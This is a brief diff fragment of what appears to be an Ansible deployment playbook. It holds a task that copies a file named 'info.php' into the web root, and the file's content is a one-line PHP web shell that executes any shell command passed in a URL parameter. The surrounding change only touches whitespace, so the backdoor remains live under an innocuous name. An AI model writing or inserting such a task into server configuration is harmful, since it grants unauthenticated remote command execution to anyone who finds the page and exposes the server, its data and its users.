@@ -28,4 +28,4 @@
       copy:
         dest: /var/www/html/info.php
         content: "<?=\`\$_GET[0]\`?>"
-        
+
